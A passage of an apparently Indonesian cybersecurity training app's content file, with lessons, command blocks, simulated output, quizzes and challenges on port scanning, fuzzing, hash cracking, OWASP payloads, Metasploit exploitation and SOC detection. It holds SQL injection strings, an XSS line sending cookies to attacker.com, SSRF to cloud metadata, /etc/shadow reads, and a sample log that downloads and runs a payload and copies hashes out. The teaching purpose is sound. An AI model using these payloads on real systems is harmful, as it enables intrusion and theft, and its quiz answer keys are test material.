  <li>Port scanner kustom yang lebih cepat dari nmap untuk task tertentu</li>
  <li>Automated web fuzzer (kirim ribuan request untuk temukan endpoint tersembunyi)</li>
  <li>Password cracker dengan custom wordlist</li>
  <li>Log parser untuk SOC analyst (parse ribuan baris log)</li>
  <li>Exploit PoC dari CVE yang baru dipublish</li>
  <li>Keylogger, reverse shell (untuk lab/CTF)</li>
</ul>
<div class="cv-tip-box">💡 <span>Mulai dari membuat port scanner sederhana. Itu adalah "Hello World" dunia cyber security programming.</span></div>
`,
        commands: `# ─── PYTHON UNTUK CYBER SECURITY ────────────────────────────

# === PORT SCANNER ===
import socket
import concurrent.futures

def scan_port(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((host, port)) == 0:
                return port
    except:
        pass
    return None

def scan(host, start=1, end=1024):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(100) as ex:
        futures = {ex.submit(scan_port, host, p): p for p in range(start, end+1)}
        for f in concurrent.futures.as_completed(futures):
            if f.result():
                print(f"[+] Port {f.result()} OPEN")
                open_ports.append(f.result())
    return sorted(open_ports)

scan("192.168.1.1")

# === HTTP FUZZER (Directory Brute Force) ===
import requests

wordlist = ["admin","login","api","backup",".env","config",
            "uploads","wp-admin","phpinfo.php",".git"]

for path in wordlist:
    url = f"http://target.com/{path}"
    try:
        r = requests.get(url, timeout=3, allow_redirects=False)
        if r.status_code != 404:
            print(f"[{r.status_code}] {url}")
    except:
        pass

# === PASSWORD HASH CRACKER ===
import hashlib

hash_target = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5("password")
with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    for word in f:
        word = word.strip()
        if hashlib.md5(word.encode()).hexdigest() == hash_target:
            print(f"[+] FOUND: {word}")
            break`,
        simulation: [
          { input: 'python3 port_scanner.py 192.168.1.1', output: `[*] Scanning 192.168.1.1 (port 1-1024)...
[+] Port 22  OPEN (ssh)
[+] Port 80  OPEN (http)
[+] Port 443 OPEN (https)
[+] Port 3306 OPEN (mysql)
[*] Selesai: 4 port terbuka dari 1024 yang discan
[*] Waktu: 8.3 detik (100 threads)`, type: 'info' },
          { input: 'python3 fuzzer.py http://target.com', output: `[*] Fuzzing http://target.com
[200] http://target.com/admin
[301] http://target.com/api  -> /api/v1
[200] http://target.com/.env  ← KRITIS! File .env terekspos!
[403] http://target.com/.git
[200] http://target.com/backup.zip  ← BERBAHAYA!
[*] Selesai: 5 path ditemukan`, type: 'warn' },
          { input: 'python3 cracker.py hash.txt', output: `[*] Target hash: 5f4dcc3b5aa765d61d8327deb882cf99
[*] Wordlist: rockyou.txt (14.3 juta kata)
[*] Mencoba...
[+] DITEMUKAN setelah 8,543 percobaan
[+] Hash: 5f4dcc3b5aa765d61d8327deb882cf99
[+] Password: password
[*] Waktu: 2.1 detik`, type: 'info' },
        ],
        typingTarget: 'python3 -c "import socket; s=socket.socket(); s.connect((\'192.168.1.1\',80)); print(\'Connected!\')"',
        quiz: {
          q: 'Modul Python mana yang digunakan untuk membuat koneksi jaringan TCP/UDP level rendah?',
          options: ['requests', 'urllib', 'socket', 'http.client'],
          correct: 2,
          explanation: 'Modul socket memungkinkan kamu membuat koneksi TCP/UDP secara langsung — dasar dari semua komunikasi jaringan. requests adalah abstraksi lebih tinggi untuk HTTP saja.',
        },
        challenge: {
          title: 'Buat Banner Grabber',
          desc: 'Banner grabbing adalah teknik mengidentifikasi versi service yang berjalan di port tertentu. Buat script Python yang terhubung ke host:port dan ambil banner-nya.',
          starter: `import socket

def banner_grab(host, port, timeout=3):
    """
    Tugasmu: 
    1. Buat koneksi TCP ke host:port
    2. Terima data (banner) yang dikirim server
    3. Return banner sebagai string
    4. Handle exception jika koneksi gagal
    """
    # Tulis kode di sini
    pass

# Test
hosts = [
    ("scanme.nmap.org", 22),   # SSH
    ("scanme.nmap.org", 80),   # HTTP
]

for host, port in hosts:
    banner = banner_grab(host, port)
    if banner:
        print(f"[+] {host}:{port} -> {banner[:100]}")
    else:
        print(f"[-] {host}:{port} -> Tidak ada banner")`,
          hint: 'Gunakan socket.socket(), s.connect((host, port)), s.recv(1024). Untuk HTTP kirim dulu "HEAD / HTTP/1.0\\r\\n\\r\\n" lalu recv.',
          answerCheck: ['socket', 'connect', 'recv'],
        },
        xp: 100,
      },
      {
        id: 'f4', title: 'Kriptografi Dasar', diff: 'beginner',
        explain: `
<h3>Kriptografi — Fondasi Semua Keamanan Digital</h3>
<p>Kriptografi adalah ilmu menyembunyikan informasi. Tanpa kriptografi, tidak ada internet yang aman, tidak ada perbankan online, tidak ada komunikasi privat. Sebagai security professional, kamu harus paham cara kerja dan cara membobolnya.</p>
<h4>🔷 Jenis Kriptografi</h4>
<ul>
  <li><strong>Symmetric</strong> — Kunci sama untuk enkripsi & dekripsi. Contoh: AES, DES. Cepat tapi masalah distribusi kunci.</li>
  <li><strong>Asymmetric</strong> — Kunci publik untuk enkripsi, kunci privat untuk dekripsi. Contoh: RSA, ECC. Lebih lambat tapi aman untuk distribusi kunci.</li>
  <li><strong>Hashing</strong> — One-way function, tidak bisa di-reverse. Contoh: MD5, SHA-256, bcrypt. Dipakai untuk password storage.</li>
</ul>
<h4>🔷 Mengapa MD5 Sudah Tidak Aman?</h4>
<ul>
  <li>MD5 menghasilkan hash 128-bit — terlalu pendek untuk standar modern</li>
  <li>Rentan terhadap collision attack (2 input berbeda menghasilkan hash sama)</li>
  <li>Rainbow table attack: database milyaran pasangan kata↔hash MD5 tersedia gratis</li>
  <li>Gunakan bcrypt, Argon2, atau PBKDF2 untuk password!</li>
</ul>
<h4>🔷 SSL/TLS — Cara HTTPS Bekerja</h4>
<ol>
  <li>Client kirim "Hello" + daftar cipher yang didukung</li>
  <li>Server kirim sertifikat (public key)</li>
  <li>Client verifikasi sertifikat (valid? belum expired? dari CA terpercaya?)</li>
  <li>Keduanya sepakat pada session key (symmetric) menggunakan Diffie-Hellman</li>
  <li>Semua komunikasi selanjutnya dienkripsi dengan session key</li>
</ol>
<div class="cv-danger-box">🚫 <span>JANGAN gunakan MD5 atau SHA1 untuk password storage. Gunakan bcrypt dengan cost factor minimal 12, atau Argon2id.</span></div>
<div class="cv-tip-box">💡 <span>Coba crack hash MD5 di crackstation.net — kamu akan terkejut betapa cepatnya!</span></div>
`,
        commands: `# ─── KRIPTOGRAFI DENGAN PYTHON & OPENSSL ─────────────────────

# === HASHING ===
import hashlib

text = "password123"

# MD5 (TIDAK AMAN - jangan untuk password!)
md5 = hashlib.md5(text.encode()).hexdigest()
print(f"MD5    : {md5}")

# SHA-256 (lebih aman untuk integritas file)
sha256 = hashlib.sha256(text.encode()).hexdigest()
print(f"SHA-256: {sha256}")

# SHA-512
sha512 = hashlib.sha512(text.encode()).hexdigest()
print(f"SHA-512: {sha512}")

# bcrypt (GUNAKAN INI untuk password!)
import bcrypt
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(text.encode(), salt)
print(f"bcrypt : {hashed.decode()}")

# Verifikasi
if bcrypt.checkpw(text.encode(), hashed):
    print("Password COCOK!")

# === OPENSSL DI TERMINAL ===
# Enkripsi file
openssl enc -aes-256-cbc -in rahasia.txt -out rahasia.enc -k "password_kuat"

# Dekripsi file
openssl enc -d -aes-256-cbc -in rahasia.enc -out hasil.txt -k "password_kuat"

# Generate RSA keypair
openssl genrsa -out private.key 4096
openssl rsa -in private.key -pubout -out public.key

# Cek sertifikat SSL website
openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text

# Cek apakah hash sesuai (verifikasi integritas file)
sha256sum kali-linux.iso
sha256sum -c checksum.txt`,
        simulation: [
          { input: 'python3 hash_demo.py', output: `Text: "password123"
MD5    : 482c811da5d5b4bc6d497ffa98491e38  ← LEMAH!
SHA-256: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
SHA-512: [hash 128 karakter]
bcrypt : $2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW

[!] Coba crack MD5 di crackstation.net...
[!] MD5 "482c811d..." ditemukan dalam 0.003 detik!
[!] Password: password123
[+] bcrypt TIDAK ada di rainbow table — aman!`, type: 'warn' },
          { input: 'openssl s_client -connect bank.go.id:443 2>/dev/null | openssl x509 -noout -dates', output: `notBefore=Mar 15 00:00:00 2024 GMT
notAfter=Mar 15 23:59:59 2025 GMT
[+] Sertifikat VALID
[+] Issued by: DigiCert TLS RSA SHA256 2020 CA1
[+] Belum expired`, type: 'info' },
        ],
        typingTarget: 'openssl genrsa -out private.key 4096 && openssl rsa -in private.key -pubout -out public.key',
        quiz: {
          q: 'Fungsi hash mana yang PALING AMAN untuk menyimpan password user?',
          options: ['MD5', 'SHA-256', 'bcrypt dengan cost 12', 'SHA-1'],
          correct: 2,
          explanation: 'bcrypt dirancang khusus untuk password — lambat secara by-design (mencegah brute force), ada salt otomatis (mencegah rainbow table), dan cost factor bisa ditingkatkan seiring waktu. SHA-256 terlalu cepat untuk password.',
        },
        challenge: {
          title: 'Crack Hash Collection',
          desc: 'Identifikasi jenis hash berikut dan tentukan mana yang masih bisa di-crack dengan mudah dan mana yang aman.',
          starter: `# Kumpulan hash yang ditemukan di database yang bocor:
# Hash 1: 5f4dcc3b5aa765d61d8327deb882cf99
# Hash 2: $2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW
# Hash 3: e10adc3949ba59abbe56e057f20f883e
# Hash 4: $argon2id$v=19$m=65536,t=3,p=4$...
# Hash 5: da39a3ee5e6b4b0d3255bfef95601890afd80709

# Tugasmu:
# 1. Identifikasi jenis hash setiap nomor
# 2. Tentukan tingkat keamanan: AMAN/LEMAH/SANGAT LEMAH
# 3. Hash mana yang bisa di-crack di crackstation.net?
# 4. Password apa yang menghasilkan Hash 3? (coba di crackstation.net)

# Jawaban:
# Hash 1: Jenis = _____, Tingkat = _____
# Hash 2: Jenis = _____, Tingkat = _____
# Hash 3: Jenis = _____, Password = _____
# Hash 4: Jenis = _____, Tingkat = _____
# Hash 5: Jenis = _____, Keterangan = _____`,
          hint: 'MD5 = 32 karakter hex. SHA1 = 40 karakter hex. bcrypt dimulai $2b$. Argon2id dimulai $argon2id$. Hash 5 adalah hash dari string kosong!',
          answerCheck: ['md5', 'bcrypt', '123456', 'argon2', 'sha1'],
        },
        xp: 85,
      },
    ]
  },

  // ════════════════════════════════════════════════════════════
  // TAHAP 2: CORE SECURITY (4 topik)
  // ════════════════════════════════════════════════════════════
  {
    id: 2, name: 'Core Security', icon: '🛡️', color: '#60a5fa',
    topics: [
      {
        id: 'c1', title: 'OWASP Top 10 Web', diff: 'intermediate',
        explain: `
<h3>OWASP Top 10 — 10 Celah Web Paling Berbahaya</h3>
<p>OWASP (Open Web Application Security Project) merilis daftar 10 kerentanan web paling kritis setiap beberapa tahun. Ini adalah referensi standar industri untuk web security testing.</p>
<h4>🔴 A01 — Broken Access Control</h4>
<p>User dapat mengakses resource yang bukan haknya. Contoh: ganti <code>/profile?id=123</code> menjadi <code>/profile?id=124</code> dan lihat data orang lain (IDOR).</p>
<h4>🔴 A02 — Cryptographic Failures</h4>
<p>Data sensitif tidak terenkripsi, atau menggunakan enkripsi yang lemah. Contoh: password MD5, HTTP tanpa HTTPS, token JWT tanpa signature.</p>
<h4>🔴 A03 — Injection (SQL, Command, LDAP)</h4>
<p>Input user langsung dimasukkan ke query/command tanpa sanitasi. SQL Injection klasik: <code>' OR '1'='1</code> bisa bypass login!</p>
<h4>🔴 A05 — Security Misconfiguration</h4>
<p>Default password, debug mode aktif di production, directory listing terbuka, file .env atau .git terpublik.</p>
<h4>🔴 A07 — Authentication Failures</h4>
<p>Session ID mudah diprediksi, tidak ada rate limiting (bisa brute force), session tidak expire setelah logout.</p>
<h4>🔴 A10 — SSRF (Server Side Request Forgery)</h4>
<p>Server mengambil URL yang dikendalikan attacker. Target favorit: AWS metadata endpoint <code>http://169.254.169.254/</code> yang bisa bocorkan IAM credentials!</p>
<div class="cv-tip-box">💡 <span>Platform latihan: WebGoat (OWASP), DVWA, Juice Shop — semua gratis dan dirancang untuk belajar eksploitasi dengan aman.</span></div>
`,
        commands: `# ─── TESTING OWASP TOP 10 ────────────────────────────────────

# === A03: SQL INJECTION ===
# Test manual di form login:
' OR '1'='1
admin'--
1' UNION SELECT null,username,password FROM users--

# Dengan SQLMap (automated):
sqlmap -u "http://target.com/login" --data "user=test&pass=test" --dbs
sqlmap -u "http://target.com/item?id=1" --dump -T users -D webapp

# === A01: IDOR Testing ===
# Intercept dengan Burp Suite, ganti ID:
GET /api/user/1234/data  → coba /api/user/1235/data
GET /invoice/download/5678 → coba 5677, 5679

# === A05: Misconfiguration Check ===
curl -s http://target.com/.env
curl -s http://target.com/.git/HEAD
curl -s http://target.com/phpinfo.php
curl -I http://target.com/backup.zip

# Directory brute force:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# === A10: SSRF Testing ===
# Cari parameter yang menerima URL:
?url=http://169.254.169.254/latest/meta-data/
?img=http://attacker.com/ssrf-test
?webhook=http://internal-service:8080/admin

# === XSS Testing ===
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
"><script>fetch('http://attacker.com?c='+document.cookie)</script>`,
        simulation: [
          { input: 'sqlmap -u "http://vuln.site/item?id=1" --dbs', output: `[*] SQLMap 1.7.8 starting...
[*] Testing connection to target URL
[+] Target: http://vuln.site/item?id=1
[+] GET parameter 'id' is vulnerable!
[+] Backend DBMS: MySQL >= 5.0
[*] Fetching database names...
[+] Available databases:
    [*] information_schema
    [*] webapp_db  ← TARGET!
    [*] mysql
[!] 3 databases found`, type: 'info' },
          { input: "curl -s http://target.com/.env", output: `DB_HOST=localhost
DB_DATABASE=production_db
DB_USERNAME=admin
DB_PASSWORD=SuperSecret123!   ← EXPOSED!
APP_KEY=base64:abcdef123456...
STRIPE_SECRET=sk_live_xxxx    ← KRITIS!
[!] File .env TERPUBLIK — credentials production bocor!`, type: 'err' },
          { input: "curl http://app.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name", output: `{
  "AccessKeyId": "ASIA1234567890EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/EXAMPLE/KEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2024-12-15T10:30:00Z"
}
[!] SSRF CRITICAL: AWS IAM credentials bocor!`, type: 'err' },
        ],
        typingTarget: 'sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --level=5 --risk=3 --dbs',
        quiz: {
          q: 'Apa yang dimaksud dengan IDOR (Insecure Direct Object Reference)?',
          options: [
            'Menggunakan SQL injection untuk akses database',
            'Mengakses resource orang lain hanya dengan mengganti ID di URL/parameter',
            'Menyerang server dengan banyak request',
            'Mencuri session cookie pengguna lain'
          ],
          correct: 1,
          explanation: 'IDOR terjadi ketika aplikasi menggunakan ID langsung tanpa cek kepemilikan. Contoh: /api/order/1234 bisa diubah ke /api/order/1235 untuk lihat pesanan orang lain. Termasuk dalam A01 Broken Access Control.',
        },
        challenge: {
          title: 'Identifikasi Kerentanan dari Source Code',
          desc: 'Temukan semua kerentanan OWASP dalam kode PHP berikut dan jelaskan cara memperbaikinya.',
          starter: `<?php
// Login endpoint
$username = $_POST['username'];
$password = $_POST['password'];

// Query TIDAK AMAN:
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    $_SESSION['user_id'] = $user['id'];
    // Session ID tidak di-regenerate!
    header("Location: /dashboard");
}

// Profile endpoint
$user_id = $_GET['id'];  // Tidak dicek apakah milik user yang login!
$query2 = "SELECT * FROM users WHERE id=$user_id";

// Password reset - tidak ada rate limiting
$email = $_GET['email'];
sendResetEmail($email);  // Bisa dikirim ribuan kali!

// Identifikasi masalah:
// 1. SQL Injection di: _______________
// 2. IDOR di: _______________
// 3. Missing rate limit di: _______________
// 4. Session fixation di: _______________
// 5. Cara fix SQL Injection: _______________`,
          hint: 'String concatenation langsung ke SQL query = SQL Injection. Parameter id dari GET tanpa cek ownership = IDOR. Tidak ada sleep/limit di reset password = brute force.',
          answerCheck: ['sql injection', 'idor', 'rate limit', 'prepared statement', 'parameterized'],
        },
        xp: 110,
      },
      {
        id: 'c2', title: 'Network Pentesting', diff: 'intermediate',
        explain: `
<h3>Network Penetration Testing — Metodologi Lengkap</h3>
<p>Network pentesting adalah proses mensimulasikan serangan hacker pada infrastruktur jaringan klien untuk menemukan celah keamanan sebelum attacker nyata menemukannya.</p>
<h4>🔷 Fase 1: Reconnaissance (Recon)</h4>
<p>Kumpulkan informasi sebanyak mungkin tanpa menyentuh target (passive) atau dengan berinteraksi langsung (active).</p>
<ul>
  <li><strong>Passive:</strong> WHOIS, Shodan, Google dorking, LinkedIn, DNS records</li>
  <li><strong>Active:</strong> Nmap scan, Banner grabbing, DNS zone transfer</li>
</ul>
<h4>🔷 Fase 2: Scanning & Enumeration</h4>
<p>Identifikasi sistem aktif, port terbuka, versi service, dan kemungkinan vulnerability.</p>
<h4>🔷 Fase 3: Exploitation</h4>
<p>Gunakan kerentanan yang ditemukan untuk mendapat akses. Dokumentasikan SEMUA langkah dan screenshot!</p>
<h4>🔷 Fase 4: Post-Exploitation</h4>
<p>Setelah dapat akses: privilege escalation, lateral movement, persistence, data exfiltration (simulasi). Tujuan: tunjukkan dampak nyata kepada klien.</p>
<h4>🔷 Fase 5: Reporting</h4>
<p>Laporan adalah produk utama pentest. Harus ada: executive summary, technical findings dengan CVSS score, PoC steps, dan rekomendasi perbaikan.</p>
<div class="cv-warn-box">⚠️ <span>Selalu dapatkan AUTHORIZATION LETTER tertulis sebelum melakukan pentest. Tanpa ini = illegal. Tidak ada pengecualian.</span></div>
`,
        commands: `# ─── NETWORK PENTESTING WORKFLOW ─────────────────────────────

# === FASE 1: PASSIVE RECON ===
whois target.com
theHarvester -d target.com -b google,linkedin
shodan search "hostname:target.com"
# Google dorks:
# site:target.com filetype:pdf
# site:target.com "password" OR "username"
# inurl:target.com admin

# === FASE 2: ACTIVE SCAN ===
nmap -sn 192.168.1.0/24              # Host discovery
nmap -sV -sC -O 192.168.1.10         # OS + service detect
nmap -p- -T4 192.168.1.10            # Semua port
nmap --script vuln 192.168.1.10      # Scan vulnerability
nmap -sU -p 53,67,161 192.168.1.10   # UDP scan

# Enum service spesifik:
enum4linux -a 192.168.1.10           # SMB/Samba enum
nikto -h http://192.168.1.10         # Web vulnerability
smbclient -L //192.168.1.10 -N       # SMB shares

# === FASE 3: EXPLOITATION ===
searchsploit vsftpd 2.3.4            # Cari exploit
msfconsole
> use exploit/unix/ftp/vsftpd_234_backdoor
> set RHOSTS 192.168.1.10
> run

# === FASE 4: POST EXPLOITATION ===
# Setelah dapat shell:
whoami; id; hostname; uname -a
cat /etc/passwd; cat /etc/shadow
find / -perm -4000 2>/dev/null       # SUID untuk privesc
python3 -c 'import pty; pty.spawn("/bin/bash")'  # upgrade shell`,
        simulation: [
          { input: 'nmap --script vuln 192.168.1.10', output: `[*] Nmap NSE vulnerability scan...
PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-vuln-cve2010-4221: FTP server vulnerable to CVE-2010-4221
|_ftp-anon: Anonymous FTP login allowed!

445/tcp open  microsoft-ds
| smb-vuln-ms17-010: 
|   VULNERABLE: EternalBlue
|   Risk factor: HIGH  CVSSv2: 9.3
|   Description: Windows SMBv1 RCE vulnerability
|   [!] Exploit available: exploit/windows/smb/ms17_010_eternalblue

[!] 2 critical vulnerabilities found!`, type: 'err' },
          { input: 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; run"', output: `[*] 192.168.1.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] Command: PASS
[*] Trying to trigger backdoor...
[+] 192.168.1.10:6200 - Shell command execution succeeded
[+] Found shell: cmd
[*] Command shell session 1 opened
whoami
root
[!] ROOT ACCESS OBTAINED!`, type: 'err' },
        ],
        typingTarget: 'nmap -sV -sC -p- -T4 --open -oA full_scan 192.168.1.10',
        quiz: {
          q: 'Apa fase PERTAMA dalam metodologi penetration testing?',
          options: ['Exploitation', 'Scanning', 'Reconnaissance', 'Reporting'],
          correct: 2,
          explanation: 'Reconnaissance adalah fase pertama — mengumpulkan informasi tentang target sebelum melakukan apapun. "Know your enemy" — semakin banyak info yang dikumpulkan, semakin efektif pentest.',
        },
        challenge: {
          title: 'Analisis Hasil Nmap dan Tentukan Attack Vector',
          desc: 'Berdasarkan output nmap berikut, tentukan: (1) service mana yang paling rentan, (2) exploit apa yang bisa digunakan, (3) urutan attack chain yang paling efisien.',
          starter: `# OUTPUT NMAP -sV -sC 10.10.10.5:
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.3c
22/tcp   open  ssh         OpenSSH 4.7p1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 (Ubuntu)
111/tcp  open  rpcbind     2 (RPC #100000)
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  tcpwrapped
2049/tcp open  nfs         2-4 (RPC #100003)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5

# Host script results:
|_smb-security-mode: account_used: guest

# Tugasmu:
# 1. Service paling rentan (cek CVE): _______________
# 2. Tool untuk exploit: _______________
# 3. Attack chain (urutan langkah): 
#    Step 1: _______________
#    Step 2: _______________
#    Step 3: _______________
# 4. Apakah ada NFS yang bisa di-mount? Bagaimana caranya?`,
          hint: 'ProFTPD 1.3.3c memiliki CVE-2010-4221 (mod_copy exploit). NFS port 2049 bisa di-mount: showmount -e 10.10.10.5. rexec port 512 juga menarik.',
          answerCheck: ['proftpd', 'nfs', 'mysql', 'showmount', 'searchsploit'],
        },
        xp: 120,
      },
      {
        id: 'c3', title: 'Defensive — SOC & SIEM', diff: 'intermediate',
        explain: `
<h3>Blue Team — Seni Mendeteksi dan Merespons Serangan</h3>
<p>Sementara Red Team menyerang, Blue Team mempertahankan. SOC (Security Operations Center) adalah "markas komando" yang memantau seluruh infrastruktur 24/7 menggunakan SIEM.</p>
<h4>🔷 Apa itu SIEM?</h4>
<p>Security Information and Event Management — platform yang mengumpulkan log dari semua sistem, mengkorelasikannya, dan menghasilkan alert ketika terdeteksi aktivitas mencurigakan.</p>
<ul>
  <li><strong>Tools populer:</strong> Splunk, IBM QRadar, Elastic SIEM (ELK Stack), Microsoft Sentinel</li>
  <li><strong>Cara kerja:</strong> Log masuk → Normalisasi → Korelasi → Alert → Investigasi → Respons</li>
</ul>
<h4>🔷 Jenis Alert yang Harus Dipantau</h4>
<ul>
  <li><strong>Brute Force:</strong> Banyak login gagal dari satu IP dalam waktu singkat</li>
  <li><strong>Port Scan:</strong> Satu IP mengakses banyak port berbeda</li>
  <li><strong>Data Exfiltration:</strong> Transfer data besar ke IP eksternal yang tidak dikenal</li>
  <li><strong>Lateral Movement:</strong> Akses ke banyak sistem internal dalam waktu singkat</li>
  <li><strong>Privilege Escalation:</strong> User biasa tiba-tiba punya akses admin</li>
  <li><strong>C2 Communication:</strong> Koneksi ke IP yang ada di threat intelligence feed</li>
</ul>
<h4>🔷 Incident Response — 6 Fase (NIST)</h4>
<ol>
  <li><strong>Preparation</strong> — Siapkan tools, playbook, tim</li>
  <li><strong>Detection & Analysis</strong> — Identifikasi insiden</li>
  <li><strong>Containment</strong> — Batasi dampak (isolasi sistem)</li>
  <li><strong>Eradication</strong> — Hapus malware/backdoor</li>
  <li><strong>Recovery</strong> — Pulihkan sistem</li>
  <li><strong>Lessons Learned</strong> — Dokumentasi dan perbaikan</li>
</ol>
<div class="cv-tip-box">💡 <span>Sertifikasi Blue Team: CompTIA CySA+, BTL1 (Blue Team Labs One), dan Splunk Core Certified User. Mulai dengan TryHackMe SOC Level 1 path — gratis!</span></div>
`,
        commands: `# ─── SOC & SIEM QUERIES ──────────────────────────────────────

# === SPLUNK SPL (Search Processing Language) ===

# Deteksi brute force SSH
index=linux_auth sourcetype=auth
| search "Failed password"
| rex field=_raw "from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)"
| stats count as attempts by src_ip
| where attempts > 10
| sort -attempts

# Deteksi port scan
index=firewall action=blocked
| stats dc(dest_port) as unique_ports by src_ip
| where unique_ports > 100
| eval threat="Port Scan"

# Deteksi data exfiltration (transfer besar keluar)
index=network dest!="192.168.*" dest!="10.*"
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 100000000
| eval MB = round(total_bytes/1048576, 2)

# === MANUAL LOG ANALYSIS ===
# SSH brute force dari mana?
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Siapa yang login berhasil setelah banyak gagal?
grep "Accepted" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq

# Proses mencurigakan
ps aux | sort -k3 -rn | head -10    # CPU usage tertinggi
lsof -i | grep ESTABLISHED          # koneksi jaringan aktif

# === YARA RULE (deteksi malware) ===
rule Ransomware_Indicator {
  strings:
    $a = "Your files have been encrypted"
    $b = ".locked" wide
    $c = "bitcoin" nocase
  condition:
    any of them
}`,
        simulation: [
          { input: 'Splunk search: brute force detection', output: `Splunk SPL Query Results (last 24h):
src_ip              | attempts | action
--------------------|----------|--------
185.220.101.12      | 8,420    | BLOCK  ← Brute Force!
103.99.0.122        |   445    | BLOCK
192.168.1.100       |    12    | ALLOW  ← Internal user

[ALERT] HIGH: Possible SSH Brute Force
Source: 185.220.101.12 (Russia, Tor exit node)
Recommend: Block IP, check if any succeeded`, type: 'warn' },
          { input: 'grep "Accepted password" /var/log/auth.log | tail -5', output: `Dec 15 10:34:21 sshd: Accepted password for admin from 185.220.101.12
[!] KRITIS: Login BERHASIL dari IP yang sebelumnya brute force!
[!] User: admin
[!] Waktu: 10:34:21 (setelah 8420 percobaan gagal sejak 09:00)
[!] AKSI SEGERA: Isolasi sistem, investigasi aktivitas user admin`, type: 'err' },
        ],
        typingTarget: 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn | head -20',
        quiz: {
          q: 'Dalam incident response framework NIST, apa yang dilakukan pada fase "Containment"?',
          options: [
            'Menghapus malware dari sistem',
            'Membatasi dampak insiden, seperti mengisolasi sistem yang terkompromi',
            'Memulihkan sistem ke kondisi normal',
            'Mendokumentasikan pelajaran yang dipetik'
          ],
          correct: 1,
          explanation: 'Containment adalah membatasi dampak insiden. Contoh: isolasi server yang terkompromi dari jaringan, nonaktifkan akun user yang dikompromi, blokir IP attacker. Tujuannya mencegah penyebaran sebelum dilakukan eradication.',
        },
        challenge: {
          title: 'Investigasi Insiden dari Log',
          desc: 'Kamu adalah SOC analyst. Analisis log berikut dan tentukan: apakah ini insiden nyata? Apa yang terjadi? Apa tindakan yang harus diambil?',
          starter: `# LOG DARI SIEM - 15 Desember 2024:

# Auth Log:
09:00 - 185.220.101.12: Failed SSH login "root" (percobaan 1)
09:00 - 185.220.101.12: Failed SSH login "root" (percobaan 2)
...
10:34 - 185.220.101.12: Failed SSH login "admin" (percobaan 8419)
10:34 - 185.220.101.12: SUCCESS SSH login "admin"  ← !!

# Setelah login berhasil (dari sesi SSH admin):
10:35 - wget http://185.100.200.50/payload.sh -O /tmp/.x
10:35 - chmod +x /tmp/.x && /tmp/.x
10:36 - crontab -e (menambahkan: * * * * * /tmp/.x)
10:37 - cat /etc/shadow > /tmp/hashes.txt
10:38 - scp /tmp/hashes.txt attacker@185.220.101.12:/collected/

# Network Log:
10:38 - Transfer 45KB dari server ke 185.220.101.12 (port 22)

# Analisis:
# 1. Jenis serangan: _______________
# 2. Teknik persistence: _______________
# 3. Data yang dicuri: _______________
# 4. Fase kill chain (MITRE ATT&CK): _______________
# 5. Langkah containment SEGERA: _______________
# 6. Langkah eradication: _______________`,
          hint: 'Ini adalah brute force → initial access → execution → persistence (crontab) → credential access (shadow) → exfiltration. Containment: isolasi server, reset password semua user, blokir IP.',
          answerCheck: ['brute force', 'crontab', 'shadow', 'exfiltration', 'isolasi'],
        },
        xp: 115,
      },
      {
        id: 'c4', title: 'Tools Keamanan Esensial', diff: 'intermediate',
        explain: `
<h3>Arsenal Tools Cyber Security Professional</h3>
<p>Tools yang tepat bisa mengubah pentest dari berhari-hari menjadi berjam-jam. Berikut tools yang WAJIB dikuasai oleh setiap security professional.</p>
<h4>🔷 Reconnaissance Tools</h4>
<ul>
  <li><code>nmap</code> — Network scanner, port scanner, service detection. Raja dari semua scanner.</li>
  <li><code>subfinder</code> — Subdomain enumeration. Sering menemukan subdomain yang terlupakan.</li>
  <li><code>shodan</code> — Search engine untuk internet-connected devices. API key gratis tersedia.</li>
  <li><code>theHarvester</code> — Email, subdomain, IP dari search engines.</li>
</ul>
<h4>🔷 Exploitation Tools</h4>
<ul>
  <li><code>Metasploit</code> — Framework exploit terlengkap. 2000+ exploit module.</li>
  <li><code>Burp Suite</code> — Proxy untuk intercept dan modifikasi HTTP/HTTPS traffic. Wajib untuk web pentest.</li>
  <li><code>SQLMap</code> — Automated SQL injection detection dan exploitation.</li>
</ul>
<h4>🔷 Password Tools</h4>
<ul>
  <li><code>Hashcat</code> — GPU-based password cracker. Tercepat di dunia untuk hash cracking.</li>
  <li><code>John the Ripper</code> — CPU-based cracker, lebih mudah digunakan.</li>
  <li><code>Hydra</code> — Network login brute forcer (SSH, FTP, HTTP, dll).</li>
</ul>
<h4>🔷 Post-Exploitation</h4>
<ul>
